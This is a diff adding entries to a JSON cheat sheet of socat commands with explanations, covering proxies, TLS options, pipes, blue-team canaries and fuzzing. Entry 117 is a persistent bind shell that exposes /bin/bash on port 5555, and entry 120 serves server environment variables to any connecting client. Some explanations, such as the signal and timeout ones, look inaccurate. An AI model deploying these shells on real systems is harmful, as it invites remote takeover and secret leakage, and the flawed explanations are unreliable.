+            "example": "socat TCP-LISTEN:8080,backlog=128 STDOUT",
+            "explanation": "Sets the listen backlog queue size to 128 connections."
+        },
+        {
+            "id": 108,
+            "category": "Set Buffer Size",
+            "command": "socat - TCP:192.168.1.50:80,sndbuf=65536,rcvbuf=65536",
+            "example": "socat - TCP:192.168.1.50:80,sndbuf=65536,rcvbuf=65536",
+            "explanation": "Manually adjusts the send and receive buffer sizes."
+        },
+        {
+            "id": 109,
+            "category": "Ignore Signals",
+            "command": "socat - TCP:192.168.1.50:80,sighup,sigint",
+            "example": "socat - TCP:192.168.1.50:80,sighup,sigint",
+            "explanation": "Configures the process to ignore SIGHUP and SIGINT signals."
+        },
+        {
+            "id": 110,
+            "category": "Lock File Protection",
+            "command": "socat TCP-LISTEN:8080,lock=/tmp/socat.lock STDOUT",
+            "example": "socat TCP-LISTEN:8080,lock=/tmp/socat.lock STDOUT",
+            "explanation": "Ensures only one instance runs by using a lock file."
+        },
+        {
+            "id": 111,
+            "category": "Fuzzing Input (Random)",
+            "command": "socat -u /dev/urandom TCP:192.168.1.50:80",
+            "example": "socat -u /dev/urandom TCP:192.168.1.50:80",
+            "explanation": "Streams random garbage data to a target port to test stability."
+        },
+        {
+            "id": 112,
+            "category": "Fuzzing Input (Zeroes)",
+            "command": "socat -u /dev/zero TCP:192.168.1.50:80",
+            "example": "socat -u /dev/zero TCP:192.168.1.50:80",
+            "explanation": "Streams infinite zero bytes to a target port."
+        },
+        {
+            "id": 113,
+            "category": "Blue Team Canary (Web)",
+            "command": "socat TCP-LISTEN:80,fork SYSTEM:'echo \"ALERT: Port 80 Access from $SOCAT_PEERADDR\" >> /var/log/canary.log; echo HTTP/1.0 200 OK; echo; echo OK'",
+            "example": "socat TCP-LISTEN:80,fork SYSTEM:'echo \"ALERT: Port 80 Access from $SOCAT_PEERADDR\" >> /var/log/canary.log; echo HTTP/1.0 200 OK; echo; echo OK'",
+            "explanation": "Logs the attacker's IP to a file whenever port 80 is touched."
+        },
+        {
+            "id": 114,
+            "category": "Blue Team Canary (SSH)",
+            "command": "socat TCP-LISTEN:22,fork SYSTEM:'echo \"ALERT: SSH Probe from $SOCAT_PEERADDR\" >> /var/log/canary.log'",
+            "example": "socat TCP-LISTEN:22,fork SYSTEM:'echo \"ALERT: SSH Probe from $SOCAT_PEERADDR\" >> /var/log/canary.log'",
+            "explanation": "Deploys a fake SSH listener that logs any connection attempts."
+        },
+        {
+            "id": 115,
+            "category": "Port Scan Detector",
+            "command": "socat TCP-LISTEN:12345,fork SYSTEM:'logger -t SOCAT \"Port scan detected from $SOCAT_PEERADDR\"'",
+            "example": "socat TCP-LISTEN:12345,fork SYSTEM:'logger -t SOCAT \"Port scan detected from $SOCAT_PEERADDR\"'",
+            "explanation": "Listens on a high port and sends a syslog message if connected to."
+        },
+        {
+            "id": 116,
+            "category": "Packet Capture Simulation",
+            "command": "socat -u TCP-LISTEN:8080,fork OPEN:/tmp/capture.pcap,creat,append",
+            "example": "socat -u TCP-LISTEN:8080,fork OPEN:/tmp/capture.pcap,creat,append",
+            "explanation": "Captures raw payloads sent to the port and saves them to a file."
+        },
+        {
+            "id": 117,
+            "category": "Red Team Persistence",
+            "command": "socat TCP-LISTEN:5555,fork,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
+            "example": "nohup socat TCP-LISTEN:5555,fork,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &",
+            "explanation": "Runs a background listener shell that respawns after disconnect."
+        },
+        {
+            "id": 118,
+            "category": "Covert Channel (ICMP)",
+            "command": "socat -v PIPE:/tmp/data IP4:192.168.1.50:1",
+            "example": "socat -v PIPE:/tmp/data IP4:192.168.1.50:1",
+            "explanation": "Tunnels data over raw ICMP protocol (Ping) traffic."
+        },
+        {
+            "id": 119,
+            "category": "Terminator (Timeout)",
+            "command": "socat -T 5 TCP-LISTEN:8080 STDOUT",
+            "example": "socat -T 5 TCP-LISTEN:8080 STDOUT",
+            "explanation": "Forces the total connection time to strictly 5 seconds, then kills it."
+        },
+        {
+            "id": 120,
+            "category": "Environment Variable Injection",
+            "command": "socat TCP-LISTEN:8080,fork EXEC:'env'",
+            "example": "socat TCP-LISTEN:8080,fork EXEC:'env'",
+            "explanation": "Prints the server-side environment variables to the connecting client."
+        },
+        {
+            "id": 121,
+            "category": "Transparent Proxy (Linux)",
+            "command": "socat TCP-LISTEN:8080,fork,su=nobody TCP:original-dest:80",
+            "example": "socat TCP-LISTEN:8080,fork,su=nobody TCP:original-dest:80",
+            "explanation": "A basic setup often used with iptables redirection for transparent proxying."
+        },
+        {
+            "id": 122,
+            "category": "Hex Dump Analysis",
+            "command": "socat -x -v TCP-LISTEN:8080 STDOUT",
+            "example": "socat -x -v TCP-LISTEN:8080 STDOUT",
+            "explanation": "Combines verbose logging and hex dumping for deep protocol analysis."
+        },
+        {
+            "id": 123,
+            "category": "File Append Mode",
+            "command": "socat -u TCP-LISTEN:8080,fork OPEN:/var/log/aggregator.log,creat,append",
+            "example": "socat -u TCP-LISTEN:8080,fork OPEN:/var/log/aggregator.log,creat,append",
+            "explanation": "Aggregates logs from multiple network sources into a single file."
+        },
+        {
+            "id": 124,
+            "category": "SOCKS Proxy Chaining",
+            "command": "socat - SOCKS4:127.0.0.1:target:80,socksuser=nobody,socksport=9050",
+            "example": "socat - SOCKS4:127.0.0.1:target:80,socksuser=nobody,socksport=9050",
+            "explanation": "Directs traffic through a secondary proxy (e.g., Tor) on port 9050."
+        },
+        {
+            "id": 125,
+            "category": "Named Pipe (FIFO) Create",
+            "command": "mkfifo /tmp/fifo; socat - PIPE:/tmp/fifo",
+            "example": "mkfifo /tmp/fifo; socat - PIPE:/tmp/fifo",
+            "explanation": "Interacts with a manually created named pipe."
+        },
+        {
+            "id": 126,
+            "category": "UDP Multicast Listener (Specific Interface)",
+            "command": "socat UDP4-RECVFROM:8888,ip-add-membership=239.0.0.1:192.168.1.10 -",
+            "example": "socat UDP4-RECVFROM:8888,ip-add-membership=239.0.0.1:192.168.1.10 -",
+            "explanation": "Listens for multicast traffic on a specific network interface IP."
+        },
+        {
+            "id": 127,
+            "category": "Send to Syslog",
+            "command": "socat - UNIX-SENDTO:/dev/log",
+            "example": "echo '<3>Critical Error' | socat - UNIX-SENDTO:/dev/log",
+            "explanation": "Injects a message directly into the local system logging socket."
+        },
+        {
+            "id": 128,
+            "category": "Listen on Interface (SO_BINDTODEVICE)",
+            "command": "socat TCP-LISTEN:8080,bindtodevice=eth0 STDOUT",
+            "example": "socat TCP-LISTEN:8080,bindtodevice=eth0 STDOUT",
+            "explanation": "Accepts connections only if they arrive on the eth0 interface."
+        },
+        {
+            "id": 129,
+            "category": "OpenSSL Cipher Selection",
+            "command": "socat - OPENSSL:192.168.1.50:443,cipher=AES256-SHA",
+            "example": "socat - OPENSSL:192.168.1.50:443,cipher=AES256-SHA",
+            "explanation": "Forces the SSL connection to use a specific cipher suite."
+        },
+        {
+            "id": 130,
+            "category": "OpenSSL Version Force",
+            "command": "socat - OPENSSL:192.168.1.50:443,method=TLS1.2",
+            "example": "socat - OPENSSL:192.168.1.50:443,method=TLS1.2",
+            "explanation": "Forces the usage of TLS 1.2 specifically."
+        },
+        {
+            "id": 131,
+            "category": "Shutdown Mode (Write)",
+            "command": "socat - TCP:192.168.1.50:80,shut-down",
+            "example": "socat - TCP:192.168.1.50:80,shut-down",
+            "explanation": "Shuts down the writing half of the connection after EOF on stdin."
+        },
+        {
+            "id": 132,
+            "category": "Shutdown Mode (Close)",
+            "command": "socat - TCP:192.168.1.50:80,shut-close",
+            "example": "socat - TCP:192.168.1.50:80,shut-close",
+            "explanation": "Completely closes the socket after EOF on stdin."
+        },
+        {
+            "id": 133,
+            "category": "Interactive Chat Server",
+            "command": "socat TCP-LISTEN:4444,fork READLINE",
+            "example": "socat TCP-LISTEN:4444,fork READLINE",
+            "explanation": "Creates a simple chat server where connected clients have line editing capabilities."
+        },
+        {
+            "id": 134,
+            "category": "Broadcast Echo Server",
+            "command": "socat UDP4-LISTEN:9999,broadcast,fork EXEC:/bin/cat",
+            "example": "socat UDP4-LISTEN:9999,broadcast,fork EXEC:/bin/cat",
+            "explanation": "Replies to broadcast packets by echoing the data back."
+        },
+        {
+            "id": 135,
+            "category": "Quick Web Client",
+            "command": "socat - TCP:example.com:80",
+            "example": "echo -e 'GET / HTTP/1.0\\r\\n\\r\\n' | socat - TCP:example.com:80",
+            "explanation": "Performs a manual HTTP GET request."
+        },
+        {
+            "id": 136,
+            "category": "Socket Pair (Internal)",
+            "command": "socat -d -d SOCKET-CONNECT:1:2 -",
+            "example": "socat -d -d SOCKET-CONNECT:1:2 -",
+            "explanation": "Connects to an already open file descriptor pair (advanced internal piping)."
+        },
+        {
+            "id": 137,
+            "category": "System Beep (Remote)",
+            "command": "socat UDP-LISTEN:9999,fork SYSTEM:'echo -e \"\\a\"'",
+            "example": "socat UDP-LISTEN:9999,fork SYSTEM:'echo -e \"\\a\"'",
+            "explanation": "Triggers the system bell/beep whenever a UDP packet is received."
+        },
+        {
+            "id": 138,
+            "category": "Wait for Port",
+            "command": "socat -u TCP:127.0.0.1:8080,retry=10,interval=1 -",
+            "example": "socat -u TCP:127.0.0.1:8080,retry=10,interval=1 -",
+            "explanation": "Retries connection to the port 10 times with 1 second intervals until successful."
+        },
+        {
+            "id": 139,
+            "category": "File Permission Set",
+            "command": "socat UNIX-LISTEN:/tmp/secure.sock,user=root,group=root,mode=600 -",
+            "example": "socat UNIX-LISTEN:/tmp/secure.sock,user=root,group=root,mode=600 -",
+            "explanation": "Creates a Unix socket with strict 600 permissions."
+        },
+        {
+            "id": 140,
+            "category": "Listen Limit",
+            "command": "socat TCP-LISTEN:8080,max-connections=1 STDOUT",
+            "example": "socat TCP-LISTEN:8080,max-connections=1 STDOUT",
+            "explanation": "Allows only a single active connection at a time."
+        },
+        {
+            "id": 141,
+            "category": "UDP Connect (Pseudo)",
+            "command": "socat - UDP-CONNECT:192.168.1.50:53",
+            "example": "socat - UDP-CONNECT:192.168.1.50:53",
+            "explanation": "Establishes a 'connected' state for UDP, allowing ICMP error tracking."
+        },
+        {
+            "id": 142,
+            "category": "Dual Stack Listen",
+            "command": "socat TCP6-LISTEN:8080,ipv6-v6only=0 STDOUT",
+            "example": "socat TCP6-LISTEN:8080,ipv6-v6only=0 STDOUT",
+            "explanation": "Listens on both IPv6 and IPv4 (dual stack) if OS supports it."
+        },
+        {
+            "id": 143,
+            "category": "Safe Cleanup",
+            "command": "socat - TCP:192.168.1.50:80; rm -f /tmp/data",
+            "example": "socat - TCP:192.168.1.50:80; rm -f /tmp/data",
+            "explanation": "Standard shell chaining to clean up files after socat exits."
+        },
+        {
+            "id": 144,
+            "category": "Process Substitution",
+            "command": "socat TCP-LISTEN:8080 SYSTEM:\"diff <(ls) <(ls -a)\"",
+            "example": "socat TCP-LISTEN:8080 SYSTEM:\"diff <(ls) <(ls -a)\"",
+            "explanation": "Serves the output of a complex shell command involving process substitution."
+        },
+        {
+            "id": 145,
+            "category": "Compression Stream",
+            "command": "socat TCP-LISTEN:8080 SYSTEM:\"gzip -c\"",
+            "example": "socat TCP-LISTEN:8080 SYSTEM:\"gzip -c\"",
+            "explanation": "Compresses incoming data on the fly using gzip."
+        },
+        {
+            "id": 146,
+            "category": "Decompression Stream",
+            "command": "socat TCP:192.168.1.50:8080 SYSTEM:\"gunzip -c\"",
+            "example": "socat TCP:192.168.1.50:8080 SYSTEM:\"gunzip -c\"",
+            "explanation": "Decompresses received network data on the fly."
+        },
+        {
+            "id": 147,
+            "category": "Base64 Encode Stream",
+            "command": "socat TCP-LISTEN:8080 SYSTEM:\"base64\"",
+            "example": "socat TCP-LISTEN:8080 SYSTEM:\"base64\"",
+            "explanation": "Encodes incoming data to Base64 format."
+        },
+        {
+            "id": 148,
+            "category": "Base64 Decode Stream",
+            "command": "socat TCP:192.168.1.50:8080 SYSTEM:\"base64 -d\"",
+            "example": "socat TCP:192.168.1.50:8080 SYSTEM:\"base64 -d\"",
+            "explanation": "Decodes incoming Base64 data back to binary."
+        },
+        {
+            "id": 149,
+            "category": "Multi-Hop Chain (Client)",
+            "command": "socat - TCP:relay1:8080 | socat - TCP:target:80",
+            "example": "socat - TCP:relay1:8080 | socat - TCP:target:80",
+            "explanation": "Manually piping two socat instances to create a hop (concept only, requires listener)."
+        },
+        {
+            "id": 150,
+            "category": "Full Duplex Pipe",
+            "command": "socat TCP:192.168.1.10:80 TCP:192.168.1.20:80",
+            "example": "socat TCP:192.168.1.10:80 TCP:192.168.1.20:80",
+            "explanation": "Bridges two remote servers together, allowing them to talk to each other through you."
+        }
+    ]
+}
